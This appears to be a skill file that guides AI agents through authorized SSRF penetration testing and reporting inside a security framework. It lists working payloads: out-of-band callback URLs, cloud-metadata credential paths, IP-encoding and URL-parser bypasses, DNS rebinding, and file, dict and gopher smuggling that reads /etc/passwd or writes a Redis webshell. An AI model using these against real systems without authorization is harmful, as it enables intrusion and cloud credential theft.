---
name: ssrf-testing
license: Apache-2.0
description: Server-Side Request Forgery testing (CWE-918, WSTG-INPV-19) — find URL/host-consuming inputs, confirm with interactsh OOB callbacks, pivot to localhost/internal ranges and AWS/GCP/Azure metadata, defeat filters with IP encodings, redirects, DNS rebinding and gopher/file/dict protocol smuggling; use whenever a parameter fetches a URL, imports a resource, renders a preview/PDF/webhook, or proxies requests.
metadata:
  author: Section9Labs
---

# SSRF Testing

Goal: make the target server issue requests you control, then aim those requests at
internal services and cloud metadata. Every parse/handoff step below ends in rupu
output (work units, `assets.mark`, or `findings.report`) — exact shapes in
`references/rupu.md`.

## 1. Find SSRF-prone inputs

Hunt any input the server dereferences:

- Query/body params named `url, uri, u, dest, destination, redirect, next, target,
  image, img, src, source, feed, rss, webhook, callback, proxy, fetch, file, path,
  page, load, link, site, host, domain, preview, open, window, data, reference, api,
  endpoint`.
- JSON API bodies: keys like `"avatar_url"`, `"webhook_url"`, `"import_url"`,
  `"callback"`, `"icon"`.
- XML bodies: XXE (`<!ENTITY x SYSTEM "http://...">`) is SSRF with a different wrapper.
- File-format sinks: SVG (`<image href=...>`), PDF/HTML-to-PDF renderers
  (`<iframe src=...>`, `<link>`, wkhtmltopdf/weasyprint), DOCX/XLSX remote resources,
  M3U/playlist imports.
- Features: "import from URL", link preview/unfurl, webhook test buttons, PDF export,
  avatar-by-URL, OpenID/OAuth `jwks_uri`/`registration` endpoints, SSO metadata URLs,
  proxy/translation endpoints, headers the backend fetches (`Referer` on analytics,
  `X-Wap-Profile`).

Harvest candidates from crawl output (`katana`, `gau`, mitmproxy `-w` capture), then:

```
cat urls.txt | python3 scripts/ssrf_probe.py work-units --work-units ssrf-units.json
```

Hand `ssrf-units.json` to the `work-units` skill to normalize/fan out (rupu
`for_each:` over the file, or a lead agent dispatching one child per unit). Record
each candidate route with `assets.mark` kind `web:route`, depth `mapped`
(`crawled` if it came from a crawler). See `references/rupu.md`.

## 2. Confirm with out-of-band (OOB) callbacks

Start the listener (single-dash long flags):

```
interactsh-client -json -o interactsh.jsonl -v
# self-hosted: interactsh-client -s oast.example.com -t <token> -json -o interactsh.jsonl
```

It prints a payload host like `cbg3...abc.oast.pro`. Inject `http://<id>.oast.pro/<marker>`
into every candidate — use a unique path marker per param (`/p1-url`, `/p2-webhook`)
so a callback maps back to the exact input. Generate the full probe set as ready
URLs/curl commands:

```
python3 scripts/ssrf_probe.py gen -u "https://example.com/fetch?url=FUZZ" \
  -c cbg3abc.oast.pro --sets oob,localhost,metadata,encodings,gopher \
  -o probes.json --curl
```

Reading `interactsh.jsonl` (one JSON object per interaction):

- `"protocol":"dns"` only → the server **resolved** your hostname. Semi-confirmation:
  outbound HTTP may be blocked, the fetch may be HTTPS-only and failed, or only a DNS
  prefetch/validator fired. Still a strong signal — keep pushing (try `https://`,
  different ports, IP-literal payloads that skip DNS).
- `"protocol":"http"` → full SSRF, the server fetched your URL. `raw-request` shows
  the server's User-Agent/headers (fingerprints the fetch library: `curl`,
  `python-requests`, `Java/1.8`, `Go-http-client` — this decides which URL-parser
  bypasses will work later).
- Match the request path against your per-param markers to attribute the hit.

Blind vs semi-blind: if the HTTP response reflects fetched content (body, error,
image dimensions, response time), you have a **read channel** — exploit internal
services directly. If nothing reflects, it's **blind** — rely on OOB, timing
(`:80` fast-refused vs filtered-timeout vs open), and status/length differentials.

Every confirmed callback becomes a finding immediately:

```
python3 scripts/ssrf_probe.py finding --url "https://example.com/fetch?url=..." \
  --param url --payload "http://cbg3abc.oast.pro/p1-url" \
  --interactions interactsh.jsonl --severity high -o finding.json
```

then submit via `findings.report` / the `finding-report` skill (CWE-918,
WSTG-INPV-19, evidence = the injected request + the OOB interaction record). Mark
the route `tested` (probed, no hit) or `exploited` (callback or internal read).

## 3. Internal targeting

Once the server fetches for you, aim inward:

- Loopback: `http://127.0.0.1/`, `http://localhost/`, `http://0.0.0.0/`,
  `http://[::1]/`, `http://0/`. Sweep ports: 22, 80, 443, 3306, 5432, 6379 (redis),
  8080, 8500 (consul), 9200 (elasticsearch), 11211 (memcached), 2375 (docker).
- RFC1918 + link-local: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`,
  `169.254.0.0/16`. Internal hostnames leaked in JS/headers/errors.
- **Cloud metadata** (highest-value target — credentials):
  - AWS IMDSv1: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
    then the role name → temporary keys. IMDSv2 needs a `PUT` + token header, so a
    plain GET SSRF failing there while IMDSv1 paths 401 tells you v2 is enforced —
    look for header-controllable or gopher-capable sinks.
  - GCP: `http://metadata.google.internal/computeMetadata/v1/...` — requires
    `Metadata-Flavor: Google` header (needs header injection or gopher).
  - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` —
    requires `Metadata:true` header.
  - When you can't reach `169.254.169.254` by name/IP, use interactsh built-in
    rebind domains: `aws.oast.fun` resolves to 169.254.169.254,
    `alibaba.oast.fun` to 100.100.100.200.
  Full per-cloud paths and credential extraction: `references/oob-and-metadata.md`.

A successful metadata-credential read is **critical** severity. Report via
`findings.report` with the request and the returned credential material (redact
secrets to prefixes) in evidence.

## 4. Filter bypasses

When `127.0.0.1`/`169.254.169.254`/internal names are blocked
(full table in `references/payloads-and-bypasses.md`):

- IP re-encodings for 127.0.0.1: decimal `http://2130706433/`, octal
  `http://0177.0.0.1/` and `http://017700000001/`, hex `http://0x7f000001/` and
  `http://0x7f.0x0.0x0.0x1/`, short `http://127.1/`, IPv6 `http://[::1]/`,
  `http://[::ffff:127.0.0.1]/`, `http://[0:0:0:0:0:ffff:127.0.0.1]/`.
- DNS that resolves where you want: `http://127.0.0.1.nip.io/`,
  `spoofed.burpcollaborator.net`-style wildcard DNS, your own A record → internal IP.
- URL-parser confusion: `http://expected.example.com@127.0.0.1/` (userinfo),
  `http://127.0.0.1#@expected.example.com/`, `http://expected.example.com%2509@127.0.0.1/`,
  backslash tricks `http://expected.example.com\@127.0.0.1/` — which works depends
  on the fetch library you fingerprinted in step 2.
- Redirect-to-internal: host an endpoint on your server returning
  `302 Location: http://169.254.169.254/latest/meta-data/` — validators that check
  the initial URL but follow redirects lose.
- DNS rebinding: a domain that answers your validator's lookup with a public IP and
  the fetcher's second lookup with 127.0.0.1 (short TTL). Beats
  resolve-then-validate-then-fetch (TOCTOU).
- Protocol smuggling: `file:///etc/passwd` (local read), `dict://127.0.0.1:6379/info`
  (one-line service probe), `gopher://` (arbitrary TCP bytes — speak Redis
  `gopher://127.0.0.1:6379/_...` to write a cron/webshell, SMTP, FastCGI, memcached →
  blind RCE). curl-backed sinks usually support all three; Java supports
  `netdoc:`, `jar:`. Crafted gopher payloads: `references/payloads-and-bypasses.md`.

## 5. Record and hand off

Per `references/rupu.md`: every probed route gets `assets.mark` (`web:route`,
correct depth rung); every confirmed SSRF gets `findings.report` (scope `endpoint`,
`target_ref` = affected URL, severity high for internal reach / critical for
metadata credentials or gopher-RCE, CWE-918 + WSTG-INPV-19, HTTP exchange + OOB
record in evidence) via the `finding-report` skill; remaining candidates ship as a
work-units array through the `work-units` skill for the next agent (e.g. a
port-sweep-via-SSRF child per internal host).
